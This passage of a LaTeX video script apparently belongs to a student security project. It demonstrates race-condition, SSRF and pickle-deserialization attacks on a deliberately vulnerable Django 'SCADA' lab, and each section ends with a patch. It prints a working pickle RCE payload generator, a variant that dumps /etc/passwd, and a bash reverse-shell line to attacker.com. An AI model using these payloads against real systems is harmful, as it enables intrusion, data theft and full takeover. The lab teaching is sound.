    print(f"Thread {thread_id} requested report {user_id}")

# Launch 2 threads simultaneously
t1 = threading.Thread(target=download_report, args=(1, 'A'))
t2 = threading.Thread(target=download_report, args=(2, 'B'))

t1.start()
t2.start()

t1.join()
t2.join()

print("Race condition complete. Check PDF contents.")
\end{lstlisting}

\textbf{Execution:}
\begin{lstlisting}[language=bash]
python3 race_condition_exploit.py

# Output:
Thread A requested report 1
Thread B requested report 2
Race condition complete.

# Check results
ls -la *.pdf
# received_by_thread_A.pdf
# received_by_thread_B.pdf

# Open both PDFs
# Sometimes thread A gets report #2 (wrong user's data!)
\end{lstlisting}

\textbf{Vulnerability Analysis:}
\begin{lstlisting}[language=Python]
# Vulnerable code uses static filename
temp_filename = "/tmp/scada_report_temp.pdf"
# Thread A starts writing report #1
# Thread B overwrites with report #2 before A finishes
# Thread A returns report #2 content!
\end{lstlisting}

\textbf{Patch:}
\begin{lstlisting}[language=Python]
import tempfile
temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.pdf')
# Unique filename per request: /tmp/tmpXYZ123.pdf
\end{lstlisting}

---

\subsubsection{10. SSRF (Server-Side Request Forgery) (2 min)}

\textbf{Tool:} Browser form + Burp Suite

\textbf{Narration:}
\begin{quote}
\textit{"SSRF allows the server to make requests to internal resources. An attacker can scan internal networks or access services only available from localhost."}
\end{quote}

\textbf{Exploit Steps:}
\begin{enumerate}
    \item Navigate to \texttt{/vulnerable/ssrf/}
    \item Normal test: Enter \texttt{https://www.google.com}
    \item Shows Google homepage content (legitimate use)
    \item Malicious test 1: Enter \texttt{http://127.0.0.1:8000/admin/}
    \item Django admin panel content displayed!
    \item Malicious test 2: Enter \texttt{file:///etc/passwd}
    \item Local file contents displayed
\end{enumerate}

\textbf{Network Scanning:}
\begin{lstlisting}[language=bash]
# Try to scan internal network
http://localhost:8000/vulnerable/ssrf/
# URL: http://172.17.0.1:22  (Docker host SSH)
# URL: http://172.17.0.2:5432  (Postgres if exists)
# URL: http://169.254.169.254/  (AWS metadata if cloud)
\end{lstlisting}

\textbf{Burp Repeater:}
\begin{lstlisting}
POST /vulnerable/ssrf/ HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded

url=http://127.0.0.1:8000/admin/
\end{lstlisting}

\textbf{Response:}
\begin{lstlisting}
Status: 200

Content:
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Django administration</title>
...
\end{lstlisting}

\textbf{Patch:}
\begin{lstlisting}[language=Python]
# Whitelist allowed domains
ALLOWED_DOMAINS = ['example.com', 'trusted-scada-node.com']
parsed_url = urlparse(target_url)
if parsed_url.netloc not in ALLOWED_DOMAINS:
    return HttpResponse("Domain not allowed", status=403)
\end{lstlisting}

---

\subsubsection{11. Deserialization RCE (3 min)}

\textbf{Tool:} Python script + Burp Suite

\textbf{Narration:}
\begin{quote}
\textit{"Deserialization RCE is the most critical vulnerability. Python's pickle module can execute arbitrary code during deserialization. This allows complete system takeover."}
\end{quote}

\textbf{Exploit Steps:}

\textbf{Step 1: Generate Payload}
\begin{lstlisting}[language=Python]
# create_rce_payload.py
import pickle, base64, os

class RCEExploit:
    def __reduce__(self):
        # This command will execute on deserialization
        return (os.system, ('touch /tmp/pwned.txt',))

exploit = RCEExploit()
payload = base64.b64encode(pickle.dumps(exploit)).decode()

print("=== PAYLOAD ===")
print(payload)
print("\nPaste this into the web form.")
\end{lstlisting}

\textbf{Step 2: Execute Exploit}
\begin{enumerate}
    \item Run script: \texttt{python3 create\_rce\_payload.py}
    \item Copy output (base64 string)
    \item Navigate to \texttt{/vulnerable/deserialize/}
    \item Paste payload into form
    \item Click "Submit Diagnostic Data"
    \item Page shows: "Object Deserialized Successfully!"
\end{enumerate}

\textbf{Step 3: Verify RCE}
\begin{lstlisting}[language=bash]
# Check if command executed
docker compose exec web ls -la /tmp/pwned.txt

# Output:
-rw-r--r-- 1 root root 0 Jan 5 10:23 /tmp/pwned.txt

# FILE EXISTS! RCE SUCCESSFUL!
\end{lstlisting}

\textbf{Advanced RCE:}
\begin{lstlisting}[language=Python]
# More dangerous payload
class AdvancedRCE:
    def __reduce__(self):
        cmd = 'cat /etc/passwd > /tmp/exfiltrated_data.txt'
        return (os.system, (cmd,))

# Or reverse shell
class ReverseShell:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"'
        return (os.system, (cmd,))
\end{lstlisting}

\textbf{Impact Demonstration:}
\begin{lstlisting}[language=bash]
# Show attacker has code execution
docker compose exec web whoami
# root

docker compose exec web cat /app/scada_system/settings.py | head -20
# Shows SECRET_KEY and database credentials!
\end{lstlisting}

\textbf{Patch:}
\begin{lstlisting}[language=Python]
# Use JSON instead of pickle
import json

def set_data(self, data):
    self.serialized_data = json.dumps(data)

def get_data(self):
    return json.loads(self.serialized_data)

# OR implement restricted unpickler
class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in ["dict", "list", "str"]:
            return getattr(__builtins__, name)
        raise pickle.UnpicklingError(f"Global '{module}.{name}' forbidden")
\end{lstlisting}

---

\subsection{Tools Showcase (4 min)}

\subsubsection{Burp Suite Workflow}

\begin{quote}
\textit{"Let me show you how I used Burp Suite for most of these attacks."}
\end{quote}

\textbf{Proxy Tab:}
\begin{itemize}
    \item Show HTTP history
    \item Highlight requests to vulnerable endpoints
    \item Filter by status code, search
\end{itemize}

\textbf{Repeater Tab:}
\begin{itemize}
    \item Send request from proxy
    \item Modify parameters live
    \item Send multiple variations
    \item Compare responses
\end{itemize}

\textbf{Intruder Tab:}
\begin{itemize}
    \item IDOR attack replay
    \item Set payload positions
    \item Number sequence payload
    \item Start attack, view results
\end{itemize}

\subsubsection{Python Exploitation Scripts}

\begin{quote}
\textit{"For complex attacks like RCE and race conditions, I used Python scripts for automation."}
\end{quote}

\begin{lstlisting}[language=Python]
import requests

# Simple automation example
for attack_type in ['auth_bypass', 'sqli', 'idor']:
    print(f"Testing {attack_type}...")
    # Execute attack logic
    # Log results
\end{lstlisting}

\subsubsection{Docker Container Introspection}

\begin{lstlisting}[language=bash]
# Access container shell
docker compose exec web bash

# Verify RCE results
ls /tmp/

# Check database
python manage.py dbshell

# View logs
docker compose logs --tail=50 web
\end{lstlisting}

\subsection{Conclusion (3 min)}

\begin{quote}
\textit{"In this video, I demonstrated 11 critical vulnerabilities in a SCADA system:"}

\begin{enumerate}
    \item \textit{Security Misconfiguration - Exposed debug information}
    \item \textit{Authentication Bypass - Passwordless admin access}
    \item \textit{Privilege Escalation - User to admin elevation}
    \item \textit{IDOR - Unauthorized report access}
    \item \textit{SQL Injection (ORM) - Filter logic manipulation}
    \item \textit{CSRF + Authorization Bypass - Unprotected state changes}
    \item \textit{File Upload \& Overwrite - Critical file manipulation}
    \item \textit{XXE - Local file disclosure}
    \item \textit{Race Condition - Data leakage between users}
    \item \textit{SSRF - Internal network scanning}
    \item \textit{Deserialization RCE - Full system compromise}
\end{enumerate}

\textit{"Each vulnerability was exploited using industry-standard tools like Burp Suite, Python scripts, and cURL. The monitoring system logged every attack attempt, proving detection capabilities."}

\textit{"The patched version addresses all these flaws through proper input validation, authentication, authorization checks, and secure coding practices."}

\textit{"In real SCADA environments, these vulnerabilities could lead to:"}
\begin{itemize}
    \item \textit{Operational disruption (device manipulation)}
    \item \textit{Data breaches (confidential reports)}
    \item \textit{Complete system takeover (RCE)}
    \item \textit{Physical damage (if SCADA controls critical infrastructure)}
\end{itemize}

\textit{"This project demonstrates the importance of:"}
\begin{itemize}
    \item \textit{Security-by-design principles}
    \item \textit{Defense-in-depth strategies}
    \item \textit{Regular security testing}
    \item \textit{Comprehensive monitoring}
\end{itemize}

\textit{"Thank you for watching this demonstration. All source code, exploitation tools, and documentation are available in the GitHub repository."}
\end{quote}

% ============================================================
\newpage
\section{Post-Production Checklist}
% ============================================================

\subsection{Video Editing}

\begin{itemize}[leftmargin=*]
    \item ✅ Remove long pauses
    \item ✅ Add title cards for each vulnerability
    \item ✅ Zoom in on important code sections
    \item ✅ Add text overlays for clarity (e.g., "Attack successful")
    \item ✅ Ensure audio levels are consistent
    \item ✅ Add intro/outro cards with contact info
\end{itemize}

\subsection{Video Export Settings}

\begin{itemize}[leftmargin=*]
    \item Resolution: 1920x1080 (1080p)
    \item Frame rate: 30fps
    \item Format: MP4 (H.264 codec)
    \item Bitrate: 8-10 Mbps
    \item Audio: AAC, 192 kbps, 48 kHz
\end{itemize}

\subsection{Upload Platforms}

\subsubsection{YouTube (Recommended)}
\begin{itemize}[leftmargin=*]
    \item Title: "Vulnerable SCADA Environment - [Video 1/2]: Monitoring System"
    \item Title: "Vulnerable SCADA Environment - [Video 2/2]: 11 Vulnerability Exploits"
    \item Privacy: Unlisted (only share link with professor)
    \item Chapters: Add timestamps for each section
    \item Description: Include GitHub repo link
\end{itemize}

\subsubsection{Alternative: Google Drive}
\begin{itemize}[leftmargin=*]
    \item Upload both videos
    \item Set sharing: Anyone with link can view
    \item No download restrictions needed (professor may want to review offline)
\end{itemize}

\subsection{Submission Package}

Include in your project submission:

\begin{enumerate}[leftmargin=*]
    \item \textbf{Video Links}
    \begin{itemize}
        \item Video 1 (Monitoring): [YouTube/Drive URL]
        \item Video 2 (Vulnerabilities): [YouTube/Drive URL]
    \end{itemize}
    
    \item \textbf{Timestamps Document}
    \begin{itemize}
        \item Video 1: Architecture 2:00, Detection 6:00, Logging 10:00, Proof 12:00
        \item Video 2: Auth Bypass 3:00, IDOR 8:00, RCE 25:00, etc.
    \end{itemize}
    
    \item \textbf{Source Files}
    \begin{itemize}
        \item All exploitation scripts (.py files)
        \item Payload files (.xml, .html)
        \item Burp Suite project file (.burp)
    \end{itemize}
\end{enumerate}

% ============================================================
\section{Common Recording Mistakes to Avoid}
% ============================================================

\begin{enumerate}[leftmargin=*]
    \item ❌ \textbf{Forgetting to clear Docker logs} - Old attacks show up in demonstration
    \item ❌ \textbf{Not testing exploits before recording} - Exploit fails on camera
    \item ❌ \textbf{Speaking too fast} - Viewers can't follow
    \item ❌ \textbf{Not zooming in on code} - Code too small to read
    \item ❌ \textbf{Terminal text too small} - Use larger font (16pt+)
    \item ❌ \textbf{Notification pop-ups} - Turn off Slack, email, etc.
    \item ❌ \textbf{Cluttered desktop} - Close unnecessary applications
    \item ❌ \textbf{Poor audio quality} - Test microphone beforehand
    \item ❌ \textbf{No script/outline} - Rambling, forgetting key points
    \item ❌ \textbf{Browser auto-fill} - Disable to avoid password leaks
\end{enumerate}

\end{document}
